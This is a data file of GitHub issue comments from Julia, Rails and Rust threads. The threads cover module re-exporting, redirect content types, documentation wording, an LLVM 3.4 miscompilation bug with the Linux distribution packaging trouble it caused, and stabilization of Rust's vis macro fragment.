julia/JuliaLang/1986/33760909,1986,"If  is going to throw if the module isn't already imported/used, it may as well be a macro? Since all imported/used modules will be in the module's scope by virtue of , it's not clear to me it needs to support relative module paths, which is the only thing a macro couldn't do. ",,False
julia/JuliaLang/1986/33763993,1986,"Whats the advantage of being a macro? It would be totally inconsistent if we have , , , ",,False
julia/JuliaLang/1986/33765869,1986,"Minimalism? It would be one fewer reserved identifier, one fewer Expr head, and in Julia instead of C. It is already a little awkward if it joins  and  as (I think) the third keyword that throws an error if another keyword has not been used before it. I kind of see the symmetry, but it doesn't seem quite right to me You can add bindings from another module to the current module and you can export bindings in the current module from the current module, but you cannot export bindings in another module from the current module unless those bindings are already also present in the current module. Personally, I would still prefer one of the two options I've created PRs for. It seems to me that is less elegant and easier to screw up than But if everyone else wants  and is averse to the  symbol, I can try to make that happen. ",,False
julia/JuliaLang/1986/33791438,1986,"Well, minimalism is a point that is always a concern when thinking about adding a keyword. I think the more general question is whether the regular Julia user should be confronted with the usage of macros. I would say no. This is an advanced thing and should not be part of the regular workflow. exportall is from my perspective something that will be needed in the ""regular use"" Its quite common to structure modules (namspaces, ...) into two levels. ",,False
julia/JuliaLang/1986/33791928,1986,"@friend Yes, writing a macro might be an advanced thing that ordinary users should not need to worry about. However, I don't think using a macro is that advanced -- they don't even need to understand how a macro works behind the scene in order to use it. All what we need is to clearly document the macro's usage. For instance, @friend is a good example which everyone can easily understand and use. Also, a code author should be quite tech savvy when he is worrying about something like re-exporting names. ",,False
julia/JuliaLang/1986/33792647,1986,"@friend macros are great. But still they do ""magical"" code transformations that I think most users should not be confronted with.  is a good example. This is a thing for advanced usage not for regular usage. I think reexporting names will be not that uncommon in practice. The export mechanism is Julias way for information hiding. And having submodules in modules is common and should also be encouraged. ",,False
julia/JuliaLang/1986/33795698,1986,"A better example for ""macros all users should be comfortable with"" is . ",,False
julia/JuliaLang/1986/33829098,1986,Which I think should be replaced with a pure Julia implementation when we can. (I have one partially implemented.) ,,False
julia/JuliaLang/1986/33831503,1986,"is pure Julia. It's just a macro. While a function could be useful for rare cases where the format string could vary at runtime, I am not sure how a function could be as performant as the macro, since the macro generates code based on the format string at load time. We also have , which is a keyword in most other languages. ",,False
julia/JuliaLang/1986/33834001,1986,Probably  and  are the best examples of macros for which my statement that macros are only for advanced users does not hold. ,,False
julia/JuliaLang/1986/33843040,1986,Comment fail. Need to try again on a different device. ,,False
julia/JuliaLang/1986/33844994,1986,"Another approach to this is not to import and then re-export, but rather to make these modules somehow ""inherit"" from the other modules. I.e. something like this In particular, one could consider a ""bare module"" – currently created with the  keyword – to be a module which inherits from no modules. However, you don't want this to be the default since it's handy to  all operators and have all of Base's exports available via . This default behavior could be expressed as this parentless module Then the default module behavior would be this Thus, writing  would be equivalent to the current  and writing  by itself would just be shorthand for . ",,False
julia/JuliaLang/1986/33846189,1986,"@friend That proposal seems elegant, but I'm a little worried about the nested module case. I guess you'd have something like To make this work, we'd have to first load all nested modules, then import their bindings, and finally load the main module. I'm not sure how big of a change this would be. I'm also not sure one always wants to inherit unexported bindings from other modules. In the nested module case, there's no reason we'd need the unexported bindings in the main module, and some could conflict. ",,False
julia/JuliaLang/1986/33846683,1986,"I didn't really mean for unexported bindings to be inherited. But yes, that is what I said. ",,False
julia/JuliaLang/1986/33846767,1986,"Needs some more thought, but I think there's something clean here. ",,False
julia/JuliaLang/1986/33869981,1986,I like Stefans proposal if it plays nice with with submodules. ,,False
julia/JuliaLang/1986/34456557,1986,"@friend Any further thoughts? Thinking about this more, I am a little worried about creating another way to import bindings that is subtly different from , , and . This might confuse more than it clarifies. ",,False
julia/JuliaLang/1986/34495713,1986,"I recently read a Julia dev paraphrasing someone else, in saying that Julia takes a ""we're all consenting adults here"" attitude. I'd very much like to be able to consent to exporting all symbols (or having a module inherit the exports of a parent, following @friend's implementation idea). If I'm writing library A, I'd like to be able to divide its concerns up into submodules of X and Y. In this way someone who only needed, say, the ""Network"" portion could employ , but most users would be opting for . There isn't any more implicit namespace pollution involved here than in the  call itself; the module inheritence would still only be acting on explicitly defined exports from modules X and Y, but I would no longer need to export every new function added to either submodule twice. (And with further nesting comes further code duplication.) I love the module implementation and its decoupling from the files themselves, it makes structuring a project (and later refactoring) that much easier. But without being able to shuttle around the symbols I'm exporting from submodule to parent, maintaining that clean organization becomes a constant thorn in the side, as you micro-manage your exports from one level to the next. It would be of further use in reducing code duplication when you have a group of conceptually related packages or modules that are always imported together. For a concrete example, there's the OpenGL library. You have the actual API versioned symbols you require, as well as the GLU library, and your own wrappers and convenience functions. For every submodule you write, you're importing three separate modules that will always be imported together in your code, instead of being able to do something like Sorry for the lack of brevity, but I wanted to share some use cases. I'm a new Julia user coming mostly from python, and I've been bitten by this problem multiple times over the last few days. ",,False
julia/JuliaLang/1986/54951838,1986,"Has there been any further progress, decision or discussion on this matter? Is @friend 's  package the agreed standard way to re-export the symbols of another package, i.e. should I use it? ",,False
julia/JuliaLang/1986/54979840,1986,"Since I haven't seen any other options emerge, I think Reexport is the de facto standard. ",,False
julia/JuliaLang/1986/54980856,1986,Thanks @friend ) I will be relying on it and will keep an eye on this thread. ,,False
julia/JuliaLang/1986/67957609,1986,It would be really great if we could have this functionality in Base. It would be great to have metapackages that simply group several packages together in order to provide a larger set of functionality. ,,False
julia/JuliaLang/1986/268856694,1986,Needs some design thoughts to figure out how we want this to work and interact with  /  /  / etc. ,,False
julia/JuliaLang/1986/270719057,1986,Crossref #14472 ,,False
julia/JuliaLang/1986/315179573,1986,I put together a macro implementation of something like this for one of my PRs as a demo ,,False
julia/JuliaLang/1986/318467060,1986,"Seems feature-y. There might be syntax we could want, but we if that does happen we can live with  a macro until 2.0. ",,False
julia/JuliaLang/1986/340823505,1986,Re-export is evil. ,,False
julia/JuliaLang/1986/383327028,1986,"I disagree that Reexport is evil. In writing a package with many levels of submodules, I find Reexport very convenient for managing namespaces across levels without lots of boilerplate code and code duplication. I echo the sentiment expressed above that this would be great functionality to have in Base. ",,False
rails/rails/17194/45054611,17194,"The  helper is hard-coded to return an html body with a Content-Type of . This can raise issues in some HTTP libraries when trying to follow non-html redirects if they try to parse the body, based on the initial request format, before following the redirect. While this isn't exactly a bug on rails's part, I think it is unexpected behavior and merits discussion on if/how it should change. The solution that makes the most sense to me would be always maintaining the content type of the instigating request and trying to come up with a sane default response for common ones, falling back to  for unrecognized ones so nobody's parsers choke on it. ",,False
rails/rails/17194/60374005,17194,"Do you have some specific examples of an HTTP library that it causes an issue with? I'm thinking about the spec for 307 redirects Unless the request method was HEAD, the entity of the response SHOULD contain a short hypertext note with a hyperlink to the new URI(s) , since many pre-HTTP/1.1 user agents do not understand the 307 status.  The same is true for 301 and 302. So I'd suspect the content type is correct, and this should remain as is. Although we should check it handles the HTTP HEAD case correctly. ",,False
rails/rails/17194/60384869,17194,@friend since you can write your own custom redirect proc I don't think it's worth addressing this within the  helper unless you can come up with a situation where this is a problem. If you can supply some further information that raises the importance of this issue we'll take another look at it. ,,False
rails/rails/17194/151672721,17194,"Ah, this just bit me again. The http library is , with . The middleware attempts to parse the redirect's body with the issued Content-Type before following the Location header. Using Faraday with FollowRedirects breaks on Rails generated redirects, both from  in controllers and  in routes. ",,False
rails/rails/17194/151678151,17194,"A proof-of-concept fork can be found here. If vetted, I'd be happy to submit it as a PR with tests, with a little direction on where I ought to put the shared code. ActionDispatch is a bit of an uncharted territory to me, and I'm not sure how it independent of ActionController it ought to be, or vice-versa. I ended up placing the method in ActionController simply because I noticed  already loaded , so why not  as well? ",,False
rails/rails/17194/152240147,17194,@friend that still sounds like bug in Faraday - is it blowing up because it's trying to parse the response as  even though it's returned as  ? ,,False
rails/rails/17194/153087843,17194,"Yep, it's making parsing assumptions based on the requested Content-Type, not the returned intermediary one. As mentioned– While this is definitely a Faraday bug, there's a case to be made for Rails to try to honor the requested Content-Type in its auto-genned responses, given that's the only actionable format information available to it at the time. ",,False
rails/rails/17194/153088585,17194,"My thoughts are mostly that this might be a nice-to-have feature with the API-friendly attitude Rails is adopting these days, rather than a bug report. Since it's something I've ran into more than once, thought I'd take its heartbeat again. ",,False
rails/rails/17194/153094226,17194,"Ugh, sorry–some of the places I've used  I meant . Got confused jumping back and forth from the client's perspective. I think getting my header nomenclature right illustrates why this feels unexpected if we asked for , and Rails isn't returning with , then it should be responding with the  we told it we would accept. Technically this isn't in spec for the  family, but it seems intuitive. ",,False
rails/rails/17194/153104487,17194,@friend I'd need to see another example of where it's a problem other than a Faraday bug before I could get behind changing it - don't want to support something going forward that isn't really necessary. ,,False
rust/rust-lang/21568/55338233,21568,"In the Compound Data Types chapter of the book, the term ""arity"" is used without any prior definition I've learned enough formal logic and programming language theory to know what ""arity"" means, but I suspect most programmers don't. (Neither does my spell checker!) And the book otherwise seems to be trying to use clear language and be readable by non-experts. I suggest changing it to ",,False
rust/rust-lang/21568/71279278,21568,"Sounds great to me, feel free to submit a pull request )  Maybe with ""types"" instead of ""type"". ",,False
rust/rust-lang/21568/71279924,21568,Or ,,False
rust/rust-lang/21568/71280756,21568,I'd prefer just defining . it's a really useful word. ,,False
rust/rust-lang/21568/71285981,21568,"It's a useful word if you do a lot of functional programming or formal logic ;-), but the rest of the book is very informal and tries hard to make J. Random Scripter feel comfortable, so tossing in a $20 word seems out of place. Maybe ",,False
rust/rust-lang/21568/71286974,21568,"But the arity refers to just the number of entries, not their types. It's an incomplete description and so awkward to define in passing. ",,False
rust/rust-lang/21568/71293679,21568,"I don't think arity need be mentionned. Saying ""contain the same types"" seems sufficient. That already has to deal with (A, B) vs (B, A). Seems to me that also deals with (A, A) vs (A, A, A). ",,False
rust/rust-lang/21568/71329687,21568,"I had seen  in the docs to, and it simply pissed me off.  Why force me to use google and dictionary.com?  Please just explain things in plain english, the docs is not a place to show off how smart you are and how advanced your english is. ",,False
rust/rust-lang/21568/71330156,21568,"@friend it's not to show off fancy language, it's a computer science term. It's a good word for any programmer to know. ",,False
rust/rust-lang/21568/71331585,21568,"@friend sometimes plain english is simply better, these are docs are supposed to make it easy to learn rust.  The reader is not likely interested in a course on rarely used computer science terms.  Just have a look part of the definition of  on wikpedia.  Cartesian product? dyadic? valency? adicity and degree? This term  comes off as very elitist.  Save it for your own blog, not the docs. ""In logic, mathematics, and computer science, the arity Listeni/ˈærɨti/ of a function or operation is the number of arguments or operands the function or operation accepts. The arity of a relation (or predicate) is the dimension of the domain in the corresponding Cartesian product. (A function of arity n thus has arity nplus one considered as a relation.) The term springs from words like unary, binary, ternary, etc. Unary functions or predicates may be also called ""monadic""; similarly, binary functions may be called ""dyadic"". In mathematics arity may also be named rank,[1][2] but this word can have many other meanings in mathematics. In logic and philosophy, arity is also called adicity and degree.[3][4] In linguistics, arity is usually named valency.[5]"" ",,False
rust/rust-lang/21568/71332345,21568,plus one for keeping  somehow. It's well worth learning the word imho. ,,False
rust/rust-lang/21568/71332960,21568,"@friend This attitude is not going to serve you well in Rust.  It's not ""elitist"" to define precise terms for concepts that may be hard to express in ""plain english"". Of course one should define them in the text.  And in this case I don't think it's worth the trouble, because there are satisfactory explanations in ""plain english"" (see above).  So, I'm in agreement with you that the text needs to be changed.  But turning it into a rant about ""elites"" is just gross and unhelpful. The thing is... when people ignore your ideas while making fun of the words you use to express them, it really does breed a bitterness and elitism, and ultimately a sort of siege mentality that you'll see in a lot of functional programming communities.  It's not pretty, and I don't want Rust to go the same way, although I don't think it's particularly likely. So please let's leave the culture war out of it.  Technical writing is hard. There are always many tradeoffs.  Just because someone uses a word you don't know, doesn't mean they're maliciously trying to feel superior to you.  My unsolicited advice Embrace being around people who know things you don't. Then you can learn from them. I hope that the Rust community will always be a safe place for that. ",,False
rust/rust-lang/21568/71585066,21568,"Slight modification. I think signature is the right word. Even if signatures' definition is unclear, the example should make it's meaning understandable; something the arity lacked.  You can assign tuples onto each other if the signature matches ",,False
rust/rust-lang/21568/76631306,21568,@friend The PR that addresses this ticket has been merged. Should this issue be closed now? ,,False
rust/rust-lang/21568/76632077,21568,"Yes, thanks. ",,False
julia/JuliaLang/6757/32839542,6757,I see this failure when running tests in my RPM package in 64-bits on a Fedora build machine. This is with git master as of today. Funnily the test passes on my machine; is it because it's been fixed in the recent hours? ,,False
julia/JuliaLang/6757/42277561,6757,"Strange... Is the  file present and can be found from where the tests are running? Sorry, I don't have access to a Fedora machine, could you run the failing test from the REPL? ",,False
julia/JuliaLang/6757/42281394,6757,"@friend As I said, I'm not able to reproduce the bug on my machine, only on the Fedora build VM. Could you suggest a few commands I could add so that the needed debug info is printed when building the package? ",,False
julia/JuliaLang/6757/42281911,6757,"Sure. Start the REPL in the test folder f = joinpath(""perf"", ""kernel"", ""imdb-1.tsv"") isfile(f) dlm_data = readdlm(joinpath(""perf"", ""kernel"", ""imdb-1.tsv""), '\t') ♠` ",,False
julia/JuliaLang/6757/42282123,6757,"@friend I can't reproduce the bug at the REPL. It would be nice if you could think of a few things which could fail, so that I put a series of debugging statements in my RPM package, and get the logs after the build runs. I'll test that the file exists, but I can't see any reason why it could be missing, so I'd like to test a few other possibilities if you have ideas (each build takes some time to start). ",,False
julia/JuliaLang/6757/42283084,6757,"A complete traceback of the exception would help identify the source line where  occurred and then we can add more debug statements. So, if the file exists, just a  of that file would print the exception stack. ",,False
julia/JuliaLang/6757/42296548,6757,"OK, got it. I think this is related to the fact that I build the RPM package against LLVM 3.4. Unfortunately, that's the only available version in Fedora 20. I've eventually simplified the command to this And I'm able to reproduce this locally when using LLVM 3.4. Do you think it's worth trying to fix? Without support for this version I'm not sure I'll be able to package Julia for Fedora -- though I need to investigate this issue since in the long-term this may prove problematic. ",,False
julia/JuliaLang/6757/42344560,6757,I use llvm 3.4 on Mac and haven't seen this failure. ,,False
julia/JuliaLang/6757/42470281,6757,"That's weird. Going back to 3.3 (where possible, it's a little hackish on Fedora 20 now) clearly fixed the problem. ",,False
julia/JuliaLang/6757/42748353,6757,Any ideas about how I could debug the problem further? ,,False
julia/JuliaLang/6757/42752784,6757,Cool! -) ,,False
julia/JuliaLang/6757/42807961,6757,"I was able to replicate this on a ubuntu 13.10 machine as well. Also observed that in method , the values in tuple  mysteriously change sometime after the call to  at line 293 (). Adding debug statements in the method shifts the problem around. Looks like some corruption? ",,False
julia/JuliaLang/6757/42809494,6757,Was that in llvm 3.4 or 3.3? ,,False
julia/JuliaLang/6757/42821709,6757,Also happens in 3.5. ,,False
julia/JuliaLang/6757/43122380,6757,"Removing 0.3 milestone, as 0.3 uses LLVM 3.3 only. We can reprioritize if this turns out to happen with LLVM 3.3 as well. ",,False
julia/JuliaLang/6757/43137328,6757,"Yet it's going to prevent me from packaging 0.3 in Fedora. Not saying it should be a blocker, but it's still relatively annoying. ",,False
julia/JuliaLang/6757/43138626,6757,Is that because fedora will only support llvm 3.4? They really shouldn't do that. Different versions of llvm are in general quite incompatible. ,,False
julia/JuliaLang/6757/43240595,6757,"Yeah, that's something I'm going to discuss with them. LLVM maintainers recently updated to 3.4, and for now I seem to be forced to follow this change. ",,False
julia/JuliaLang/6757/43242235,6757,That is a bummer if we can't be in the next fedora release. ,,False
julia/JuliaLang/6757/43331800,6757,I've just asked LLVM Fedora maintainers about this problem ,,False
julia/JuliaLang/6757/43430916,6757,"If the fix does not require major work, it would be really nice if we can fix this issue for LLVM 3.4 for the 0.3 release. ",,False
julia/JuliaLang/6757/43445566,6757,"Yeah, that and all the other bugs we don't yet know about. ",,False
julia/JuliaLang/6757/43445834,6757,"I am sure there are others. Let's see what the Fedora LLVM maintainers say. Otherwise, IIUC, we could be in the fedora-updates repository. ",,False
julia/JuliaLang/6757/43446920,6757,"Yeah, there may well be other bugs hidden somewhere... At least tests should catch the most important ones. @friend fedora-updates is the normal place were new packages appear, and that's really not a problem to be there. The question is rather, can Julia be included at all? But we'll likely figure out a solution. ",,False
julia/JuliaLang/6757/43465082,6757,"Not sure how useful this is, but the cutoff point to get this error is around 15 lines. For example,  works, but  fails. (It's sort of context-dependent, as taking  fails at . so maybe total # characters). ",,False
julia/JuliaLang/6757/43617166,6757,"I see the same change of  that @friend sees, and it appears to happen between when  calls  and the catch block for the  thrown by . When I try to print  in the catch block, the  value is correct, but I get a segfault in  because one of the arguments has been nulled out. So it seems like we are clobbering the stack somewhere. ",,False
julia/JuliaLang/6757/43746422,6757,"Here is where  is changed. Manually resetting this address to 16 allows the read to complete without the . @friend any ideas? why would we be passing a tuple on the stack and then overwriting that space? calls jl_alloc_tuple 0x00007ffff45b6214 &lt;julia_dlm_fill;17354+532&gt;   ff d0   callq  *%rax    0x00007ffff45b6216 &lt;julia_dlm_fill;17354+534&gt;   48 89 c3    mov    %rax,%rbx    0x00007ffff45b6219 &lt;julia_dlm_fill;17354+537&gt;   48 89 9c 24 98 01 00 00 mov    %rbx,0x198(%rsp) fill the tuple 0x00007ffff45b6221 &lt;julia_dlm_fill;17354+545&gt;   0f 28 44 24 60  movaps 0x60(%rsp),%xmm0 =&gt; 0x00007ffff45b6226 &lt;julia_dlm_fill;17354+550&gt;   66 48 0f 7e c7  movq   %xmm0,%rdi ♠ ",,False
julia/JuliaLang/6757/44283402,6757,I'll have a look at this. Thanks for the through analysis so far. ,,False
julia/JuliaLang/6757/44682535,6757,"@friend Hi. For demonstration purposes I've built julia from your SPEC file on build.opensuse.org, which has Fedora 20 as build target, but Fedora there is as it was released, e.g. no fedora-updates. So it still has LLVM 3.3. Tests were passed successfully. See the link  see you cannot use these packages in up-to-date Fedora 20, but only with original, released image. These packages are for demonsration only. ",,False
julia/JuliaLang/6757/44691125,6757,"@friend Interesting. Actually, I can do the same using Fedora's Copr build service. As you said, the problem appears when trying to install the package, since LLVM 3.3 conflicts with the latest Mesa from fedora-updates. It would be interesting to try to adapt the various Fedora packages to SuSE. ",,False
julia/JuliaLang/6757/44712990,6757,"@friend Hm, how do you restrict a build job on Copr to use Fedora w/out updates? I see someone tried to build julia on openSUSE, if you search for a 'julia' on ",,False
julia/JuliaLang/6757/44745204,6757,"@friend Actually, I don't need to it seems that the 'fedora' repo is available from Copr, even if 'fedora-updates' is available too. Making the Julia package depend on LLVM 3.3 works. Regarding openSUSE packages, IIRC the existing Julia package bundles all dependencies, and to get included in the distribution one should package libraries separately as I did for Fedora. But we're really out of topic here, better move the discussion elsewhere. ",,False
julia/JuliaLang/6757/45046605,6757,"I see this can be reduced to just julia&gt; readdlm(IOBuffer(""a\na"")) ERROR BoundsError()  in setindex! at ./array.jl308  in colval at ./datafmt.jl324  in store_cell at ./datafmt.jl195  in dlm_fill at ./datafmt.jl303  in dlm_fill at ./datafmt.jl316  in readdlm_string at ./datafmt.jl276  in readdlm_auto#88 at ./datafmt.jl59  in readdlm#86 at ./datafmt.jl49  in readdlm#84 at ./datafmt.jl46 ",,False
julia/JuliaLang/6757/45293718,6757,"But this one works, with extra space at the beginning of string ",,False
julia/JuliaLang/6757/45305541,6757,Same issue with readcsv (one backend) ,,False
julia/JuliaLang/6757/45450408,6757,"FWIW, we're probably going to be able to use LLVM 3.3 in Fedora (even though this may take a bit longer). Doesn't mean this bug shouldn't be fixed, of course! ",,False
julia/JuliaLang/6757/51305806,6757,@friend do you had a chance to look into this? ,,False
julia/JuliaLang/6757/51438527,6757,"I looked at briefly, but never got to isolate it. It's on my todo list though (I wanted to work on it today, but got held up by #7868). I can confirm that this is an optimizer bug though, so the first thing I'll do tomorrow is disable passes and see what makes it work. ",,False
julia/JuliaLang/6757/51689339,6757,"Just to point a fix to this issue would help for the official Debian package. The next release of Debian will not feature LLVM 3.3, only 3.4 and 3.5 (the Debian maintainer of LLVM says that 3.3 is too old now and unmaintained). And the Debian freeze happens on early november, so Julia 0.4 will not be ready by then. So my only option is to ship Julia 0.3 with LLVM 3.4 or 3.5. ",,False
julia/JuliaLang/6757/51689598,6757,We can do a point release of Julia 0.3.x that uses LLVM 3.5. ,,False
julia/JuliaLang/6757/51689641,6757,"@friend That would be great. The Debian deadline is roughly end of October, but even if the point release happens after that, I could still backport patches that are on the 0.3 git branch. ",,False
julia/JuliaLang/6757/51690101,6757,"Also, the general attitude that distros have about LLVM is not reasonable or healthy. LLVM is not a normal library that you can just upgrade or downgrade willy nilly – it is core infrastructure for building compilers and programming languages – the exact version matters a lot. By contrast, every distro seems to let you choose among a dozen different Python versions. Yet no one is willing to support more than one arbitrarily chosen version of LLVM at a time. ",,False
julia/JuliaLang/6757/51690308,6757,"Yes, we will have to do a julia 0.3.x release built for LLVM 3.5 in order to support various distros. ",,False
julia/JuliaLang/6757/51690409,6757,Can still get GCC versions back to 4.4 in Debian and plenty of other distributions. Treating LLVM any differently makes zero sense. ,,False
julia/JuliaLang/6757/51690508,6757,"@friend For the particular case of Debian, there are several LLVM versions coexisting. Currently there are 3.3, 3.4, 3.5 and 3.6-svn in Debian unstable. But 3.3 is going to be removed soon, because it is considered too old and unmaintained. ",,False
julia/JuliaLang/6757/51690549,6757,"Yes, upstream has stopped maintaining it, is the main reason. In any case, there is very little we can do about these policies. I do wish that they would let us ship with our own copy of LLVM 3.3, which we can install in  instead of system directories. Not allowing that seems excessive. ",,False
julia/JuliaLang/6757/51690639,6757,"I think @friend recently started doing exactly that in his PPA - since we only statically link to LLVM and don't install any of its headers, the only downside to doing it that way is compile time. ",,False
julia/JuliaLang/6757/51690762,6757,"@friend If I were shipping a private copy of LLVM 3.3, I would still have to maintain it for the lifetime of Debian Jessie, which means for the next two years. At least I would have to track security issues. Given that it's already unmaintained upstream, it is an unnecessary burden which nobody is willing to take in Debian. ",,False
julia/JuliaLang/6757/51692847,6757,"What I have taken to doing in the Ubuntu case, is building our own LLVM, statically linking it with Julia, and calling it good.  Note that there are no LLVM products that are shipped with Julia in this case; everything is statically linked into , so there's no chance of it messing with other installations.  There is still the maintenance burden though. ",,False
julia/JuliaLang/6757/51693878,6757,"I completely understand you not wanting to maintain LLVM 3.3 for Debian, but declaring a version that is less than a year old completely dead is kind of strange. We may just have to declare that LLVM is part of the Julia source and not even pretend that linking against it as a shared library provided by the distro is going to work. ",,False
julia/JuliaLang/6757/51694939,6757,"@friend The decision that LLVM 3.3 is dead was taken by the LLVM developers, not by Debian. Embedding a copy of LLVM 3.3 in Julia will not solve the issue, at least for Debian, for reasons explained above. ",,False
julia/JuliaLang/6757/51695268,6757,"I understand that the constraints of a distro like Debian are different than yours. And at a personal level, I cannot do much about the decision to remove LLVM 3.3 (I tried to argue with the Debian maintainer), and I cannot embed a copy of LLVM 3.3 in the Julia package because this completely goes against the spirit of a distro and could create problems with other parties (such as the security team). My current plan is to ship Julia 0.3 with LLVM 3.5. But if this is something that you definitely don't want to see happen because it could give a bad image of Julia, then the only option left is to not have Julia in the next Debian release. This would be sad, but this is not the end of the world either. ",,False
julia/JuliaLang/6757/51695824,6757,"Having a buggy version of Julia in the distribution is probably better and easier to fix later than no version at all, though that's up to Stefan, Jeff, Viral etc to decide. Sounds like this maintenance policy question really needs to be raised on the LLVM list, as more and more downstream projects depend on and distributions need to include specific older versions, and this is starting to interact poorly with LLVM's fast break-everything development style (which has other benefits, but gets in the way here). I know Rust has their own set of problems wrt distributions and bootstrapping, but what happens when Rust hits 1.0 for example? They're probably going to need to support a fixed version of LLVM for a while. ",,False
julia/JuliaLang/6757/51696086,6757,"I wasn't under the impression that Debian liked to ship buggy versions of things, but apparently they prefer that to allowing us to link to, you know, our dependencies. We could stand to get a better sense of how well julia 0.3 works with LLVM 3.5. We know there is a failing test, but we should try commenting out that test and see if everything else passes at least. ",,False
julia/JuliaLang/6757/51696213,6757,"I'm currently discussing the same issue for Fedora. I may be allowed to use LLVM 3.3 for the next release, but it's not sure yet.  more out-of-tree compilers like Julia and Rust rely on LLVM, it seems they really should review their release policy. ",,False
julia/JuliaLang/6757/51696595,6757,"@friend On my 64-bit machine, I can confirm that  is the only failing test with LLVM 3.5. ",,False
julia/JuliaLang/6757/51696734,6757,That's nice. Keno and several others have been going above &amp; beyond to try to keep julia working with LLVM 3.5 reasonably well. ,,False
julia/JuliaLang/6757/51698686,6757,"3.5 has OldJIT still... we could switch that back on with 3.5, although that setup is untested - whereas several of us have been using mcjit regularly. On Aug 9, 2014 354 PM, ""Jeff Bezanson"" notifications@friend.com wrote ",,False
julia/JuliaLang/6757/51701045,6757,Has anybody tested the performance of the old jit vs mcjit? I remember having read that the old jit was faster. Is it really an issue to have a package that has a statically linked llvm3.3? How do we do it with libuv? Isn't our version patched so that we cannot use upstream? ,,False
julia/JuliaLang/6757/51701770,6757,I'll have another go at the readdlm thing next week. Hopefully I can figure it out in time for the 3.5 release. ,,False
julia/JuliaLang/6757/51708647,6757,"@friend Indeed libuv is included as an embedded copy in the Debian package. But first, this is supposed to be a temporary situation (see the JuliaLang/libuv#2). And second, libuv is a much smaller codebase than LLVM. Which means that it is much more manageable to maintain a forked embedded copy of libuv than one of LLVM. ",,False
julia/JuliaLang/6757/52439248,6757,I've started to run some experiments on which IR passes cause this in order to try to identify the IR pattern that gets miscompiled. First results Encouraging isn't it ;)? ,,False
julia/JuliaLang/6757/52439803,6757,Seems to be a problem with LLVM's Stack Slot coloring ,,False
julia/JuliaLang/6757/52440002,6757,"Specifically, stack slot sharing Feels like I'm getting closer ) ",,False
julia/JuliaLang/6757/52442227,6757,Here's a debug dump from the stack coloring pass The second one is with sharing disabled. As you can see the first one deletes two stack slots. Of course this isn't necessarily a problem with the stack coloring pass. It might also be a problem with the analysis pass that it uses. ,,False
julia/JuliaLang/6757/52450909,6757,"@friend Why were you thinking the tuple is passed on the stack. From looking at the generated code, the callee is expecting it in xmm. ",,False
julia/JuliaLang/6757/52454765,6757,"As far as I can tell, the stack coloring transformation is correct, so I wonder what's going on. ",,False
julia/JuliaLang/6757/52536712,6757,"Wow, nice sleuthing! (I missed your question last night...) limping through the disassembly, more or less. ",,False
julia/JuliaLang/6757/52537590,6757,"Also, for posterity and general enjoyment, here's the code I wrote to track this down ",,False
julia/JuliaLang/6757/52540686,6757,I see you use  as the extension for your C++ source files now ) The application of julia metaprogramming to C++ here is absolutely mind-boggling. ,,False
julia/JuliaLang/6757/52541100,6757,"Whoa. When you go bug-hunting, you carry some heavy weaponry! Poor things don't stand a chance. ",,False
julia/JuliaLang/6757/52542191,6757,"Yeah, I love the ",,False
julia/JuliaLang/6757/52551260,6757,"This is nuts. @friend, you've outdone yourself. ",,False
rust/rust-lang/41022/218789015,41022,"Tracks stabilization for accepting  as a fragment specifier in macros, gated by . Introduced in #41012. ",,False
rust/rust-lang/41022/301950519,41022,I tried in #40984 to parse a pattern like  but the visibility isn't enough to terminate the repetition. It's unclear if this is a systemic issue with  or if it can be worked around. ,,False
rust/rust-lang/41022/338007000,41022,Is this mature enough to be stabilized? ,,False
rust/rust-lang/41022/338009629,41022,45388 will be a minor breaking change to  consider . ,,False
rust/rust-lang/41022/351260526,41022,Shall we stabilize this? ,,False
rust/rust-lang/41022/358159818,41022,This feature was implemented and tested in  AFAICT there have been no issues or problems since then. @friend fcp merge ,,False
rust/rust-lang/41022/358159824,41022,"Team member @friend has proposed to merge this. The next step is review by the rest of the tagged teams  [ ] @friend [x] @friend [ ] @friend [ ] @friend [ ] @friend [ ] @friend [ ] @friend  No concerns currently listed. Once these reviewers reach consensus, this will enter its final comment period. If you spot a major issue that hasn't been raised at any point in this process, please speak up! See this document for info about what commands tagged team members can give me. ",,False
rust/rust-lang/41022/358377655,41022,I would like to see a comment pointing out the relevant tests so I can review the behavior. =) ,,False
rust/rust-lang/41022/358519542,41022,"@friend concern if we make further changes to the visibility modifiers as we continue to evolve the module system, will this cause back compat issues here? ",,False
rust/rust-lang/41022/358529572,41022,"I would assume that  will continue to match whatever visibility specifiers are added. Such further changes should be carefully designed to avoid introducing ambiguities. On Wed, Jan 17, 2018 at 939 PM, Nick Cameron notifications@friend.com wrote ",,False
rust/rust-lang/41022/358803094,41022,"I agree with @friend. This is definitely ""a thing"", but I think that to a large extend these ambiguities exist already. For example, introducing the  modifier and the possibility of paths like  introduced an ambiguity that affects the  visibility specifier -- but also tuple structs (same with  style visibility modifiers). ",,False
rust/rust-lang/41022/358803254,41022,@friend thanks for the examples. ,,False
rust/rust-lang/41022/370936760,41022,"@friend Was your concern adequately addressed, or do you have more questions? ",,False
rust/rust-lang/41022/370984740,41022,"@friend it kind of does. However, we seem to be very close to settling on a final design for modules/visibility reform and it seems to me that waiting another month or so for that before stabilising would be beneficial. Consider the concern resolved if others don't think that meaningfully reduces risk. ",,False
rust/rust-lang/41022/371237979,41022,"@friend hmm -- actually -- now that you mention it =) So the main change there (which is not afaik controversial) is that we are going to add  as a keyword. One would expect the behavior of  to change when  is added, which may of course break macros. This is of course nothing new. ( also adds a measure of ambiguity -- at least in some proposals -- in that paths could plausibly begin with .) I continue to regret that we have format specifiers at all. All that said, I'm still sort of inclined to go forward with . We routinely break macros by extending Rust's grammars, sadly enough. But it'd be nice to know what the approved follow-set of  is, I forget. As long as it's suitably narrow, this shouldn't be a big problem. ",,False
rust/rust-lang/41022/371247292,41022,"The follow set is currently   all identifiers and keywords except  tokens that  meta-var which is ,  or   We may need to change rule 2 to exclude . But why  is outside of the follow-set while  is in it? Or is it just an oversight? 🤔 ",,False
rust/rust-lang/41022/371253306,41022,"I can't say I appreciate the fatalistic attitude of ""well, we're going to break macros and assume there's no opposition"". But in that case, perhaps we should hold off stabilizing vis until  is a keyword? On Wed, Mar 7, 2018 at 203 PM, kennytm notifications@friend.com wrote ",,False
rust/rust-lang/41022/371271054,41022,@friend  is already a keyword... ,,False
rust/rust-lang/41022/371278017,41022,"Yes, I (and @friend I guess) meant it is going to be accepted as a keyword in a new context. ",,False
